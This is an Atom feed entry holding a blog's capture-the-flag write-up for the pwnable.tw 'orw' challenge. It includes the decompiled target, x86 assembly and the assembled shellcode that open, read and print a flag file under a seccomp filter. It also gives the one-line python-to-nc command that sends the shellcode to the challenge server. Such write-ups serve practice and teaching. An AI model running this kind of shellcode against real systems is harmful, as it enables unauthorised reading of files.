@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - assembly</title>
+	<link href="/tags/assembly/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2019-09-15T19:37:08.225+00:00</updated>
+	<id>/tags/assembly/atom.xml</id>
+	<entry xml:lang="en">
+		<title>pwnable.tw - orw</title>
+		<published>2019-06-11T19:45:48.202+00:00</published>
+		<updated>2019-09-15T19:37:08.225+00:00</updated>
+		<link href="/posts/pwnable-tw-orw/" type="text/html"/>
+		<id>/posts/pwnable-tw-orw/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Read the flag from &lt;code&gt;&#x2F;home&#x2F;orw&#x2F;flag&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Only open read write syscall are allowed to use.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;nc chall.pwnable.tw 10001&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;&#x2F;h1&gt;
+&lt;p&gt;The binary simply reads in 200 bytes and then jumps to its address, after using &lt;code&gt;prctl&lt;&#x2F;code&gt; to prevent calling &lt;code&gt;execve&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+  orw_seccomp();
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Give my your shellcode:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  read(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,shellcode,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  (&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(code &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)shellcode)();
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;By using &lt;code&gt;strace&lt;&#x2F;code&gt;, we see that &lt;code&gt;orw_seccomp&lt;&#x2F;code&gt; calls &lt;code&gt;prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len = 12, filter = 0x400000020})&lt;&#x2F;code&gt;.&lt;br &#x2F;&gt;
+Based on this and the challenge description, it is clear that we cannot use a &lt;code&gt;execve&lt;&#x2F;code&gt; shell code like in the 
+&lt;a href=&quot;https:&#x2F;&#x2F;srikavin.me&#x2F;blog&#x2F;posts&#x2F;5cfff3292569df08a43d04cc-pwnabletw-start&quot;&gt;previous challenge&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;To assemble shellcode, I used an &lt;a href=&quot;https:&#x2F;&#x2F;defuse.ca&#x2F;online-x86-assembler.htm&quot;&gt;online x86 assembler&lt;&#x2F;a&gt; rather than setting 
+up nasm. We know that the flag is located in &lt;code&gt;&#x2F;home&#x2F;orw&#x2F;flag&lt;&#x2F;code&gt;. Our shellcode needs to accomplish the following:&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] buffer;
+fd &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;open(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;home&#x2F;orw&#x2F;flag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, RD_ONLY);
+read(fd, buffer, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+write(stdout, buffer, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We can refer to a &lt;a href=&quot;http:&#x2F;&#x2F;shell-storm.org&#x2F;shellcode&#x2F;files&#x2F;syscalls.html&quot;&gt;Linux x86 syscall table&lt;&#x2F;a&gt; to see the syscall 
+numbers. The following is (sub-optimal) assembly code that I wrote that will open the file, read its contents, and write 
+to &lt;code&gt;stdout&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;push &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x6761
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;push &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x6C662F77
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;push &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x726F2F65
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;push &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x6D6F682F
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;# open(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;home&#x2F;orw&#x2F;&#x2F;flag&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;RD_ONLY)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;xor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;eax, eax
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;add &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;5
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ebx, esp
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;xor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ecx, ecx &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;# &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;= RD_ONLY
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;xor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;edx, edx &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;# 
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x80
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;# read(fd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, esp, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ebx, eax
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ecx, esp
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;add &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;edx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x30
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x80
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;# write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, esp, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;xor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ebx, ebx
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;add &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ebx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ecx, esp
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x80
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Assembling it gives us the following byte string:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x31\xC0\x83\xC0\x05\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\x83\xC2\x30\xCD\x80\xB8\x04\x00\x00\x00\x31\xDB\x83\xC3\x01\x89\xE1\xCD\x80
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we just have to pipe into the challenge, and we get the flag.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;python -c &amp;#39;print &amp;quot;\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x31\xC0\x83\xC0\x05\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\x83\xC2\x30\xCD\x80\xB8\x04\x00\x00\x00\x31\xDB\x83\xC3\x01\x89\xE1\xCD\x80&amp;quot; | nc chall.pwnable.tw 10001
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;</content>
+	</entry>
+</feed>
